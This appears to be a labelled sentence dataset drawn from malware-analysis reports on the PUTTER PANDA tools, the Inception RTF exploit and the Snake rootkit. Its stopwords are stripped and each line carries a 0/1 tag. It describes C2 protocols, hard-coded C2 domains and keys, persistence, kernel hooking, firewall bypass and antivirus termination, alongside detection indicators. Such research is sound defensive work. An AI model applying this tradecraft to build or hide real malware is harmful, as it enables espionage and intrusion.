The key modulo values vary per-sample basis	0
Decoded C2 settings along sample metadata listed Appendix 2	0
The RAT programmed C++ using Microsoft Visual Studio makes use object-oriented parallel programming features environment ; Standard Template Library ( STL ) objects used represent data structures strings lists custom objects used represent C2 command handlers ( e.g. CCommandCMD )	0
Several threads used handle different stages C2 protocol receiving data server decrypting data processing commands	1
Standard Windows primitives Events used synchronize across threads shared global structure used hold state	0
Once running RAT load binary representation date/time value file C \RECYCLER\restore.dat sleep date/time passed	1
Database provides mechanism operators allow RAT remain dormant fixed time perhaps allow means regaining access parts toolset removed victim system	1
As 4H RAT C2 protocol used 3PARA RAT HTTP based using GET POST requests	1
An initial request made C2 server ( illustrated Figure 11 ) response value effectively ignored ; likely request serves connectivity check C2 activity occur first request successful	1
In case RAT transmit basic victim information C2 server along 256-byte hash hard-coded string HYF54 & % 9 & jkMCXuiS	1
It likely request functions means authenticate RAT C2 server register new victim machine controller	1
A sample request structure shown Figure 12	0
If request also successful RAT attempt retrieve tasking controller using distinctive HTTP request shown Figure 13 repeating request every two seconds valid tasking returned	1
Returned tasking decrypted using DES algorithm CBC mode key derived MD5 hash string HYF54 & % 9 & jkMCXuiS ( used secondary beacon shown )	0
If fails RAT fall back decoding data using 8-byte XOR key derived data returned HashData API key string	0
Output data produced tasking instructions encrypted manner decrypted sent back C2 server via HTTP POST request URI form /microsoft/errorpost/ default.aspx ? ID= ID value random number decimal representation – initial request shown Figure 4	1
The set commands supported RAT somewhat limited indicating perhaps RAT intended used second-stage tool failsafe means attackers regain basic access compromised system ( consistent support sleeping certain date/time )	1
Some supported commands implemented using C++ classes derived base CCommand class •C CommandAttribe – Retrieve metadata files disk set certain attributes creation/ modification timestamps	0
• CCommandCD – Change working directory current C2 session	0
•C CommandCMD – Execute command standard input/output/error redirected C2 channel	0
• CCommandNOP – List current working directory	0
However commands implemented way	0
These commands contain functionality • Pause C2 activity random time interval	0
• Shutdown C2 activity exit	0
•P rovide date time beaconing resume recorded file C \RECYCLER\ restore.dat noted	0
The use C++ classes inherit base class carry tasking commands along use concurrency features indicates developers RAT put thought architecture design tool although decision implement commands outside class-based framework curious may indicate multiple developers worked RAT ( single developer shifting preferences coding style )	0
The pngdowner malware simple tool constructed using Microsoft Visual Studio implemented via single C++ source code file	0
This sample contains PDB path Y \Visual Studio 2005\Projects\branch-downer\ downer\Release\downer.pdb similar paths Z \Visual Studio 2005\Projects\pngdowner\Release\ pngdowner.pdb Z \Visual Studio 2005\Projects\downer\Release\downer.pdb also observed samples	0
Appendix 3 lists metadata known pngdowner samples	0
Initially malware perform connectivity check hard-coded URL ( http //www.microsoft.com ) using constant user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; )	1
If request fails malware attempt extract proxy details credentials Windows Protected Storage IE Credentials Store using publicly known methods15 using proxy credentials subsequent requests enable outbound HTTP access	1
An initial request made hard-coded C2 server initial URI – forming URL form ( sample ) http //login.stream-media.net/files/xx11/index.asp ? 95027775 numerical parameter represents random integer	1
A hard-coded user agent myAgent used thisrequest subsequent communication C2 server	0
Content returned request C2 server saved file named index.dat user's temporary directory ( i.e. % TEMP % )	0
This file expected contain single line specifying URL filename	0
The malware attempt download content specified URL filename within user 's temporary directory execute file via WinExec API	1
If execution attempt succeeds final C2 request made – case URL using path initial request ( similarly random parameter ) filename success.asp	1
Content returned request saved file immediately deleted	0
Finally malware delete content saved first request exit	1
The limited functionality lack persistence tool implies used simple download- and-execute utility	1
Although version mentioned uses C++ along Visual Studios Standard Template Library ( STL ) older versions RAT ( MD5 hash b54e91c234ec0e739ce429f47a317313 ) built 2011 use plain C. This suggests despite simple nature tool developers made attempts modify perhaps modernize code	0
Both versions contain debugging/progress messages '' file success ''	0
Although displayed victim likely used developers simple means verify functionality code	0
Like pngdowner httpclient malware simple tool provides limited range functionality uses HTTP C2 channel	1
This malware also initially performs connectivity check www.microsoft.com using hard-coded user agent Mozilla/4.0 ( Compatible ; MSIE 6.0 ; ) although variant attempt made extract proxy credentials	1
The malware connect configured C2 infrastructure ( file.anyoffice.info ) perform HTTP request form shown Figure 14 Content returned C2 server deobfuscated XOR'ing content single byte 0x12	1
The decoded data checked string runshell	0
If string present C2 request repeated every 0.5 seconds	1
Otherwise shell process started ( i.e. cmd.exe ) input/output redirected C2 channel	1
Shell commands server followed encoded string $ $ $ indicates shell session continue	0
If session ended two commands supported m2b ( upload file ) b2m ( download file )	1
Slight variations C2 URLs used different phases C2 interaction Given lack persistence mechanism low level sophistication likely httpclient – like pngdowner – used second-stage supplementary/backup tool	0
Appendix 4 lists metadata observed httpclient samples	0
Other CrowdStrike reporting describes dropper used PUTTER PANDA ( abc.scr ) install 4H RAT	1
This dropper uses RC4 decrypt embedded payload data embedded resource writing payload disk executing	1
Several instances dropper observed commonly association 4H RAT also relation tools described forthcoming reporting	0
Another dropper observed exclusively installing pngdowner malware ( example MD5 hash 4c50457c35e2033b3a03fcbb4adac7b7 )	1
This dropper simplistic nature compiled single C++ source code file	0
It contains Word document plaintext ( written BienvenueaSahajaYogaToulouse	0
doc ) along executable ( Update.exe ) DLL ( McUpdate.dll )	0
The executable DLL contained within .data	1
section dropper obfuscated 16-byte XOR key ( consisting bytes 0xA0 – 0xAF )	1
Both document executable written disk executed via ShellExecute API ( using verb '' open '' )	1
The executable also installed ASEP registry key HKCU\Software\Microsoft\Windows\ CurrentVersion\Run value named McUpdate	1
Finally dropper deletes via batch file	1
The dropped executable ( MD5 hash 38a2a6782e1af29ca8cb691cf0d29a0d ) primarily aims inject specified DLL ( McUpdate.dll MD5 hash 08c7b5501df060ccfc3aa5c8c41b452f ) process would normally accessing network likely order disguise malicious activity	1
Module names corresponding Outlook Express ( msinm.exe ) Outlook ( outlook.exe ) Internet Explorer ( iexplore.exe ) Firefox ( firefox.exe ) used	0
If Internet Explorer used malware attempt terminate processes corresponding two components Sophos Anti-Virus ( SAVAdminService.exe SavService.exe )	1
Four examples droppers located using mixture decoy PDF Microsoft Word documents ( shown Figures 15-18 )	1
The common theme throughout documents space technology ( BienvenueaSahajaYogaToulouse.doc follow trend could targeted workers Toulouse Space Centre '' largest space centre Europe '' ) indicating attackers keen interest sector also reflected choice name C2 domains used ( see Attribution section )	0
A number specific generic detection methods possible RAT host network	0
These detailed designed expand upon indicators reported CrowdStrike reporting	0
The following Windows registry artifacts indicative compromised host redacted ) The presence following file system artifacts indicative compromised host A file mapping named & *SDKJfhksdf89*DIUKJDSF & *sdfsdf78sdfsdf also indicates victim machine compromised PUTTER PANDA malware	0
In addition domains listed Appendices Attribution section generic signatures used detect activity malware described report	0
In addition indicators described PUTTER PANDA distinct generic TTPs PUTTER PANDA determined adversary group operating several years conducting intelligence-gathering operations significant focus space sector	0
Although tools simplistic taken whole toolset provides wide degree control victim system provide opportunity deploy additional tools	1
Research presented report shows PUTTER PANDA operators likely members 12th Bureau 3rd General Staff Department ( GSD ) People 's Liberation Army ( PLA ) operating unit 's headquarters Shanghai MUCD 61486	0
Strategic objectives unit likely include obtaining intellectual property industrial secrets relating defense technology particularly help enable unit 's suspect mission conduct space surveillance remote sensing interception satellite communications	0
PUTTER PANDA likely continue aggressively target Western entities hold valuable information intellectual property relevant interests	0
The detection mitigation guidance given report help minimize risk successful compromise actors future CrowdStrike reports examine elements PUTTER PANDA toolset	0
CrowdStrike Falcon Intelligence portal provides enterprises strategic customized actionable intelligence	0
Falcon Intelligence enables organizations prioritize resources determining targeted versus commodity attacks saving time focusing resources critical threats	0
With unprecedented insight adversary tools tactics procedures ( TTPs ) multi-source information channels analysts identify pending attacks automatically feed threat intelligence via API SIEM thirdparty security tools	0
Access CrowdStrike Falcon Intelligence geared toward levels organization executivewho needs understand business threat strategic business impact front-line securiyt professional struggling ght adversary's attack enterprise	0
CrowdStrike Falcon Intelligence web-based intelligence subscription includes full access variety feature sets including CrowdStrike Falcon Host endpoint threat detection response product identifies unknown malware detects zero-day threats prevents damage targeted attacks real-time	0
Falcon Host comprised two core components cloud-based management console on-premises host-based sensor continuously monitors threat activity endpoint prevent damage real-time	0
Falcon Host leverages lightweight kernel-mode sensor shadows captures correlates low- level operating system events instantly identify adversary tradecraft activities Stateful Execution Inspection ( SEI ) endpoint Machine Learning cloud	0
As opposed focusing malware signatures indicators compromise exploits vulnerabilities Falcon Host instead identifies mission objectives adversary leveraging Kill Chain model provides realtime detection focusing attacker opposed looking nfor specific easily changeable indicator used attack	0
Without performing intrusive performance- impacting scans system Falcon Host 's highly efficient real-time monitoring system activity security solution provides maximum visibility adversary activities including Adversary-in-Motion reconnaissance exploitation privilege escalation lateral movement exfiltration	0
Falcon Host delivers insight past current attacks single host also across devices networks	0
Stateful Execution inspection Stateful Execution Inspection ( SEI ) tracks execution state links together various stages kill chain initial code execution data exfiltration	0
CrowdStrike 's Real-time Stateful Execution Engine performs inspection analysis understand full context cyber attack	0
SEI critical understanding entire attack life cycle preventing damage advanced malware targeted attacks	0
Existing security technologies focus solely malware signatures incidators compromise exploits vulnerabilities fail protect majority attacks blind full scope adversary activity	0
CrowdStrike global provider security technology services focused identifying advanced threats targeted attacks	0
Using big-data technologies CrowdStrike 's next-generation threat protection platform leverages real-time Stateful Execution Inspection ( SEI ) endpoint Machine Learning cloud instead solely focusing malware signatures indicators compromise exploits vulnerabilities	0
The CrowdStrike Falcon Platform combination big data technologies endpoint security driven advanced threat intelligence	0
CrowdStrike Falcon enables enterprises identify unknown malware detect zero-day threats pinpoint advanced adversaries attribution prevent damage targeted attacks real time	0
CrowdStrike Services wholly owned subsidiary CrowdStrike responsible proactively defending responding cyber incidents pre post Incident Response services	0
CrowdStrike 's seasoned team Cyber Intelligence professionals Incident Responders Malware Researchers consists number internationally recognized authors speakers experts worked publicized challenging intrusions malware attacks recent years	0
The CrowdStrike Services team leverages Security Operations Center monitor full CrowdStrike Falcon Platform provide cutting-edge advanced adversary intrusion detection services	0
The full spectrum proactive response services helps customers respond tactically well continually mature strategically evolve Incident Response program capabilities	0
After reading Inception paper Snorre Fagerland Waylon Grange I got curious threat reversing	0
I felt would good write technical blog process - maybe could helpful interesting	0
RTF file Analysis MD5 4a4874fa5217a8523bf4d1954efb26ef Exploit CVE-2012 - 0158 As see following screen shot RTF [ Rich Text Format ] file	0
Its common attackers use document files bait	0
It common shellcode starts NOPsled	0
In following screenshot see embedded shellcode starts NOP slide	0
NOP No OPeration - single - byte opcode nothing	0
It hex value 0x90	0
Now functionality shellcode	0
We ignore first two prolog instructions remaining statements I inserted comments help understanding happening chunk code	0
It 's traversing TEB PEB Ldr structure get base addresses ntdll.dll kernel32.dll	0
It needs find API addresses requires rest infection	0
In screenshot Function 00120F82 malware 's GetProcAddress function takes two parameters The function returns memory address API	0
As shown next screenshot function parses " export name pointer table " .dll [ ex	0
kernel32.dll ] generates hash function	0
It compares argument API hash ( Ex DF7D9BAD GetFileSize see screenshot ) using CMP EDI ESI instruction	0
Once matching API found parses Export Address Table returns respective API address caller EAX register	0
The document contains two levels shellcode	0
We analyzing first level following code see typical egghunting method It attempts open already opened rtf file checking file handles memory	0
It starts handle value 4 verifies GetFileSize	0
If fails ADD ESI,4 ( adds 4 handle ) API succeeds	0
When happens checks file offset 0x8300 marker 0x54405450	0
Again matches allocates memory reads file content jumps 2nd level shellcode JMP EBX	0
Now landed second level shellcode obfuscated evade static analysis	1
At initial stage instructions waiting help us	0
This deobfuscation code	0
We see 0x23B * 4 number bytes obfuscated POP EBX get EIP instruction 0x5687F945 deobfuscation XOR key	0
In following code see hexadecimal value corresponds library name pushed LoadLibrary function well two loops get API addresses using " CALL 02E203E2 " function	0
Here also uses hashes look APIs	0
In following code searches embedded VBS file inside RTF file memory	0
It checks file size loop size larger 0x2000 sets file ponter 0x8C14 compare VBS file marker see following screenshot	0
After finding VBS marker memory decrypts VBS file two iterations	0
In first loop decrypts second loop swaps low high bytes first 0x100 16-bit words writes file file named " Temp / ew_Rg.vbs "	0
The following screenshot shows part .VBS payload file dropped .RTF file	0
First line encrypted .dll 4th line contains Key decrypt .dll	0
Remaining part self - explanatory	0
The instruction c = Crypt(c k ) function decrypts encrypted dll returns decrypted dll	0
( See screenshot ) c= encrypted dll	0
k = decryption key	0
Following function writes byte byte dropped.dll file	0
Finally following code executes " regsvr32 " command run wmiprvse.dll silent mode sets run key registry	0
This first level deobfuscation wmiprvse.dll takes around 3 - 4 minutes finish	0
Then allocates memory using VirtualAlloc writes unpacked code newly allocated memory jumps unpacked code shown following screen shot	0
This dll 3 layers unpacking	0
The one level one iyou see level two	0
We see passing control newly unpacked .dll @CALL EAX	0
It 's time - consuming understand functionality dll decrypts builds runtime import table hinder analysis	1
Analyst directly see API gets called	0
Finally see 's connecting webdav.cloudme.com cleartext credentials following screenshot	1
Malware tries communicate user account created WebDAV C&C exfiltrate system user information	1
Reference	0
https://www.bluecoat.com / security - blog/2014 - 12 - 09/blue - coat - exposes-%E2%80%9C- inception - framework%E2%80%9D - - sophisticated - layered - malware	0
One questions comes months big security whitepaper disclosures ? In words happened operators tools infrastructure revealed reports blog-posts press interviews	0
Did continue re-build disclosed infrastructure tools go away get jobs another line work ? In cases disclosure little impact operation	0
For example McAfee ShadyRAT report 2011 absolutely change attacks group behind	0
However Mandiant released APT1 report 2013 noticeable reduction activity group – much tools infrastructure seen since	0
In September 2010 issue Foreign Affairs magazine former US Deputy Secretary Defense William J. Lynn discussed cyber-attack happened two years previously DoD's classified computer networks	0
Lynn described foreign intelligence agency planted malicious code networks aim transferring data servers control	0
The article included oft-quoted phrase 'digital beachhead ' describe undoubtedly significant compromise US military systems	0
Further reports press kept story alive 2011 since threat received remarkably little attention	0
However operation behind attacks continued little modification tools techniques spite widespread attention years ago	0
They use highly sophisticated malware tools maintain persistent access targets	1
These tools used covert communications number different modes present significant challenges traditional security technologies detect	1
There threats come go whilst others permanent features landscape	0
In paper describe tools techniques one sophisticated persistent threats track	0
We hope help victims identify intrusions understand need improve defences	0
Cyber security collaborative effort – operation described paper raises bar security community efforts keep attackers cyber-space	0
When antivirus back-end classification platforms identify malware family analysed malicious sample assign generic names '' Trojan Horse '' '' Agent ''	0
The variant letters also assigned automatically using hexavigesimal ( Base26 ) notation	0
That variant letters auto-assigned starting '' A '' followed '' B '' '' Z ''	0
Next comes '' AA '' '' AB '' '' ZZ ''	0
After variant letters start '' AAA '' '' AAB '' '' ZZZ ''	0
Back 2008 unknown malicious file discovered auto-classified '' Agent.BTZ '' meaning registered unknown malicious sample # 1,898 anti-virus classification system	0
It n't given actual name generic one	0
Meanwhile internally authors behind malware using naming systems - specific titles file components projects '' snake '' '' uroburos '' '' sengoku '' '' snark '' used denote variants framework	0
A recent report German security company GData described sample '' uroburos '' variant framework	0
Their report revealed complex nature malware family showed operation behind '' Agent.BTZ '' continued	0
As result disclosure also releasing technical analysis threat including timeline known samples known Command-and-Control ( C & C ) servers indicators aid investigators discovering attacks	0
Reverse engineering recent malware samples shows much advanced variants Agent.BTZ though still sharing many similarities encryption methods original	0
Further investigation allowed us locate related samples compiled 2006 2014 spanning across several distinctive generations	0
The first section report gives overview samples collected reported timelines derived analysis	0
Snake 's architecture turned quite interesting	0
We identified two distinct variants highly flexible two different techniques establishing maintaining presence target system	1
In general operation relies kernel mode drivers making rootkit	0
It designed covertly install backdoor compromised system hide presence components provide communication mechanism C & C servers enable effective data exfiltration mechanism	1
At time Snake exposed flexibility conduct operations engaging noticeably different architectures	0
In first model network communications carried userland - i.e	1
area computer system application software executes	0
In another model network communications handled kernel mode driver - i.e	1
area lower level system code device drivers run	0
The choice architecture used may depend specific target 's environment allowing Snake operators choose suitable architecture deployed	1
In architectures kernel mode driver installed usermode DLL injected driver system processes	1
In architectures 32-bit 64-bit code involved	0
In order distinguish architectures call usermode-centric kernel-centric architectures respectively	0
The remainder report gives detailed explanation two Snake architectures embed target system communicate outside world	0
We also provided set technical indicators Appendix enable organisations security research community identify compromises	0
In total collected 100 unique files related espionage toolkit	0
Many submitted online malware analysis websites victims investigators several years	0
In many cases source country information submission available	0
These allow us visualise distribution countries malware seen Whilst view likely tip iceberg give us initial insight profile targets Snake operations	0
Other useful visualisations operations come compile timestamps	0
Below shown table count number files sample set recent years	0
Two samples compiled late January 2014 show activity ongoing	0
Plotting day week samples compiled shows familiar pattern analysts modern cyber-attacks	0
The creators malware operate working week like professional	0
The single sample set compiled Saturday outlier n't alter conclusion	0
Similarly plotting hour day samples compiled reveals another human pattern – working day	0
This adjusted UTC+4 show possible fit operators ' local time	0
The usermode-centric architecture Snake known used 2011 till 2014 recent sample compiled January 28 2014	0
With architecture Snake driver mainly used load DLL module usermode processes use module communications	1
One analysed samples exposed multiple debug messages source control check-in logs	0
It clear messages allowed deployed driver - possibly operational security lapse	0
However give insight internal structure source code	0
For example analysed driver gave away following source file names The source control check-in log examples showing names developers 'vlad ' 'gilg ' It also exposed project name particular variant 'sengoku ' Now 's time execute driver see	0
When first executed driver creates device named \Device\vstor32 symbolic link \DosDevices\vstor32	1
This device used userland/kernel communications	1
Next drops DLL % windows % directory - DLL carried body driver binary chunk XOR 0xAA applied top driver decrypts first	1
Depending variant DLL dropped either random name hard-coded name mscpx32n.dll	1
The purpose DLL injected user-mode processes	1
Some variants Snake carry DLL modules installed service run within taskhost.exe services.exe processes	1
Next driver sets hooks following kernel-mode APIs After calls PsSetCreateProcessNotifyRoutine ( ) order notified whenever new process started	1
The handlers hooks along notification callback allow Snake stay persistent system able infect newly created processes restore driver file case gets deleted	1
Another set hooks sets designed hide presence Snake components system The driver watches userland processes see load web pages	1
As long user using Internet Snake stays dormant process communicates web servers	1
However soon user goes online driver intercepts event immediately injects malicious DLL module process initiated connection ( browser )	1
Once injected module initiates polling one hard-coded C & C servers	1
The purpose behaviour blend Snake 's traffic browser traffic bypassing firewalls keeping low profile time	1
By communicating within process also communicates even technically savvy user find challenging detect Snake traffic among legitimate traffic	0
The reason behind difficulty modern web pages often fetch pages different web servers including data additional scripts CSS templates advertising contents analytics data blogs social networking data etc	0
When intercepted purpose analysis traffic may literally represent hundreds DNS HTTP requests made popular website news website open	0
Hiding DNS/HTTP requests among busy network traffic allows Snake rootkit stay unnoticed	1
In order test Snake 's communications C & C servers still able clearly distinguish traffic small tool built generate GET request web server running analysed system	0
The tool named chrome.exe order trigger malware communications	0
As long test tool named chrome.exe make requests memory stayed pristine	0
There injections made driver	0
As soon tool made first GET requests driver immediately injected malicious DLL module module started producing following traffic ↓ The domain names C & C servers relies hard-coded body malware	1
Some examples given full list known domains given Appendix D As seen traffic dump malware first resolves domain name C & C	1
Next fetches file /D/pub.txt expects server respond string '' 1 '' acknowledging 's active Once acknowledged asks server command server returns new command execute The command receives C & C ( swim.onlinewebshop.net ) encrypted	1
In order decrypt malware first applies XOR mask bytes start offset 0x40 An identical XOR mask also used Agent.BTZ	1
Next calculates confirms CRC32 checksum within command decrypts data using Number Theory Library ( NTL ) makes sure command destined current host matching ID field	1
Once decrypted malware interprets received command reflected malware log ( new C & C server address highlighted ) After malware connects new C & C asking another command The command receives called UpLoad uploads collected logs server cleans logs The files uploads stored inside home directory % windows % \ $ NtUninstallQ [ random ] $ [ random ] random number	1
For example Snake 's home directory could C \WINDOWS\ $ NtUninstallQ812589 $	0
The files within directory used rootkit store configuration log data	1
When decrypted XOR key used Agent.BTZ files expose following contents Analysis sample reveals supports 3 modes fetching C & C commands	1
• In first mode relies Windows Internet ( WinINet ) APIs HttpOpenRequest ( ) HttpSendRequest ( ) InternetReadFile ( ) etc	1
• In second mode uses Windows Sockets 2 ( Winsock ) APIs WSAStartup ( ) socket ( ) connect ( ) send ( ) etc	1
• In third mode works 'pipe server ' mode passes web requests interested ( client ) pipe server runs within Windows Explorer ( explorer.exe ) and/or Internet Explorer ( iexplore.exe ) processes	1
Memory pipes common mechanism Inter-Process Communications ( IPC )	0
When pipe server reads requests pipes performs web request behalf client using WinINet APIs effectively serves proxy	0
The diagram demonstrates last 'pipe server ' mode Snake operation The diagram illustrates operation steps 1-4 1 First malicious driver embedded DLL module injects DLL system process services.exe ; loaded DLL function 'pipe server ' mode	1
2 As soon driver detects usermode process goes online ( e.g browser ) inject malicious DLL module ; depending operational mode DLL may start communicating C & C directly	1
3 In 'pipe mode ' operation injected DLL start communicating pipe server sending messages established inter-process communication pipes	1
4 Once task communication C & C delegated pipe server start communicating C & C bypassing host-based firewalls keep infected system process white-list	1
The reason behind pipes usage 'legitimise ' outbound web requests forcing originate host firewall- friendly system services	1
Pipe server special mode injected DLL	0
In order switch mode dedicated thread spawned listen IPC messages received pipes	1
The memory pipes used Snake named Apart GET / POST requests pipe clients ( infected usermode processes ) may also ask pipe server perform operations behalf saving data temporary file copy / delete files save configuration data registry aforementioned ShellCore value	1
This delegation tasks designed keep infected processes radar behavioural analysis tools long possible	1
Another reason overcome account restrictions imposed browser process order able write files / registry	1
To delegate different types tasks clients send messages pipe server using following task identification headers The usermode component Snake communicates kernel-mode driver via device called \\.\vstor32 ( created kernel \Device\vstor32 )	1
In communication protocol driver uses IOCTL code 0x222038	0
To write data opens device CreateFile ( '' \\.\vstor32 '' ) calls DeviceIoControl ( ) API handle IOCTL code 0x222038	1
Configuration parameters along initial set domain names hard-coded within body DLL	1
However data appears defined structures likely DLL could generated stand-alone builder 'patches ' DLL new/updated list C & C	0
Analysis commands performed malware suggests following capabilities Together commands provide complete backdoor functionality allowing remote attacker full control compromised system	1
The ability update driver rely communication capabilities means components Snake flexible making possible existence hybrid ( kernel-centric usermode-centric ) architectures	1
For example virtual partitions used kernel-centric Snake variants kernel-mode driver responsible communications	1
If driver installed via update usermode component instructed delegate file upload task driver copying necessary logs shared virtual partition physically located compromised host thus accessible kernel	1
This particular architecture relies kernel-mode driver carry network communications	1
The usermode DLLs still injected system processes perform high-level tasks	1
The delivery mechanism known may distributed via thumb-drive phishing email attachment delivered via exploit across network ( e.g	1
using reconnaissance tool explained later )	0
Infection starts dropper penetrating compromised system allowed run	1
Once executed dropper installs kernel mode driver pre-defined location	1
The dropper 32-bit run 32-bit 64-bit Windows OS ( WoW64 mode )	0
On 32-bit OS install 32-bit driver	1
On 64-bit OS install 64-bit driver	1
The analysed 32-bit dropper creates driver following location However different samples may use different path driver file name	1
For example samples exposed filenames fdisk32.sys A0009547.sys Ultra3.sys	0
The filename dropper could rknginst.exe fdiskmon.exe	0
Once executed driver first makes sure registered pre-defined name Ultra3	0
Other samples may different registration name ~ROOT	0
The registration ensured creation following registry entries The driver flags following events notification purposes The rootkit places number hooks	1
The first API hooks IoCreateDevice ( )	1
The installed hook handler calls original API checks name device netbt afd	1
If install TDI filter driver	1
If device name Null Beep tcpip Nsiproxy activate enabling hooks designed hide presence Snake system set access control lists messaging system	1
In order hide components driver hooks following APIs For example hook handlers registry-related APIs block access registry entries contain name driver	1
In one example rootkit blocks access registry entries contain strings '' Ultra3 '' '' ~ROOT ''	1
The ZwReadFile ( ) hook handler block access home directory rootkit keeps file	1
In one analysed kernel-centric Snake samples home directory hard-coded % windows % \ $ NtUninstallQ817473 $ blocked file read access directory	1
The ZwClose ( ) hook handler used inject DLL module userland processes	1
The hook handler ZwTerminateProcess ( ) checks process shut svchost.exe	1
If considers system shutdown unloads usermode DLL deactivates network drivers like ZwShutdownSystem ( ) hook handler gets invoked	1
The ObOpenObjectByName ( ) hook designed hide presence virtual partitions ( described later )	1
To encrypt data stored virtual partitions driver sets hook another API To re-infect usermode process svchost.exe re-enable network drivers rootkit hooks APIs Snake proceeds task deep packet inspection modification	1
In order accomplish registers callout driver Windows Filtering Platform ( WFP ) architecture first introduced Windows Vista nowadays normally used antivirus and/or intrusion detection systems inspect/block malicious traffic	1
Snake sets filters layers FWPMLAYERSTREAMV4 FWPMLAYERALEFLOWESTABLISHEDV4 TCP/ IP stack callout driver notified whenever TCP connection established browser	1
When happens rootkit triggers event named \BaseNamedObjects\wininetactivate	1
When data arrives intercepted FwpsCopyStreamDataToBuffer0 ( ) API scanned presence hidden commands C & C	1
The driver inspects bidirectional network data per stream basis 's located right stream data path	1
An ability manipulate data streams provided packet injection logic allowing Snake covertly insert traffic destined C & C servers In order qualify browser usermode process must following names In addition WFP Snake also hooks Transport Driver Interface ( TDI ) network routines setting TDI filter driver	1
TDI considered deprecated removed future versions Microsoft Windows 's still supported Windows 7	0
Being registered TDI driver device stack Snake hooks TCP calls	1
This way intercepts requests along parameters via IRP ( IO request package ) hooks	1
By 'sniffing ' requests inspect traffic looking parsing GET / POST HTTP requests also SMTP communications order distinguish commands addressed	1
If rootkit detects OS version pre-Vista ( e.g Windows XP ) Windows Server 2008 ( e.g Windows Server 2003 ) invoke FwpsStreamInjectAsync0 ( ) API order generate outbound requests	1
Whenever client establishes connections TDI driver also 'pulse ' \BaseNamedObjects\wininetactivate event like WPF driver 's component order notify userland service event	1
The data driver intercepts along important notifications passed userland DLL processed	1
If data contains commands C & C DLL module expected execute report results back driver delivered back C & C	1
For NDIS versions 5.X Snake rootkit contains code installs NDIS filter intermediate driver	1
This driver set miniport driver ( driver communicates physical device ) protocol driver ( driver implements protocol e.g	1
TCP/IP )	0
The driver registered NdisIMRegisterLayeredMiniport ( ) API	1
After drivers hooks following exports within ndis.sys The rootkit contains code installs NDIS filter driver NDIS 6.0 NDIS filter driver configuration stored registry entry The driver registered NdisFRegisterFilterDriver ( ) API	1
After drivers hooks following exports within ndis.sys ( NDIS 6.0 ) Another set exports attempts hook ndis.sys ( NDIS 6.0 ) With hooks installed whenever network adapter driver attempts register NDIS whenever attempt install NDIS intermediate driver NDIS filter driver hook handlers register Snake 's MiniportXxx functions NDIS library	1
With miniport handler functions send / receive data using private TCP/IP stack bypassing firewall hooks making open ports invisible scanners	1
The Snake rootkit registers Network Driver Interface Specification ( NDIS ) protocol driver	1
Whenever underlying miniport driver receives data network calls NDIS invoking data receive indication function NdisMIndicateReceiveNetBufferLists ( )	1
When happens NDIS invokes Snake 's hook function ( ProtocolReceiveNetBufferLists ) process received data	1
To send data back protocol driver defines data list NETBUFFERLIST structures passes NDIS calling NdisSendNetBufferLists ( )	1
NDIS turn calls miniport driver's MiniportSendNetBufferLists ( ) function forward data underlying miniport driver	1
Being able fully manipulate traffic 3 different levels ( NDIS protocol driver TDI Driver WPF callout driver ) Snake able 'inject ' traffic existing communications reach external components time parse incoming traffic detect traffic addressed As driver intercepts connections ( e.g	1
TDIRECEIVE TDI event ClientEventReceive ( ) event notification triggered TDI Filter Driver ) parses incoming HTTP SMTP traffic see authenticated Snake traffic	1
The authentication implemented decrypting data making sure starts markers 0xDEADBEAF 0xC001BA5E ( appear derive 'DEAD BEEF ' 'COOL BASE ' )	1
Here specific steps By observing behaviour one might wonder driver expecting HTTP SMTP clients ? Why act like HTTP/SMTP server processing client traffic serving back normal responses per protocol ? For example HTTP driver respond messages like '' HTTP/1.1 200 OK '' '' HTTP/1.1 500 Server Error ''	1
For SMTP traffic communicates back normal SMTP server responses '' 250 Sender OK '' '' 503 Bad sequence commands '' etc	0
The reason behind behaviour driver acting mode like proxy routing requests infected hosts remote C & C server	1
Another opportunity mode unlocks peer-to-peer network mode centralised C & C	0
The infected hosts capable transferring following peer-2-peer commands defining fragment size reliability parameters new peer information peer impersonation flags etc	0
Once incoming data authenticated decrypted driver passes DLL using memory pipes	1
For example HTTP traffic arrival may send traffic data memory pipe \Device\NamedPipe\isapihttp send received peer-2-peer command message writepeernfo= [ IPADDRESS PORT ] 0fragnoscrambling=Y0 another memory pipe called \Device\NamedPipe\isapidg	1
In order log activity driver writes log data pipe \Device\NamedPipe\isapilog DLL could log data log files	1
Full list named pipes used communications provided Messages submitted pipes wrapped structures	1
The structures appear contain headers allow pipe server runs within infected userland module identify messages first unwrap structures accordingly	1
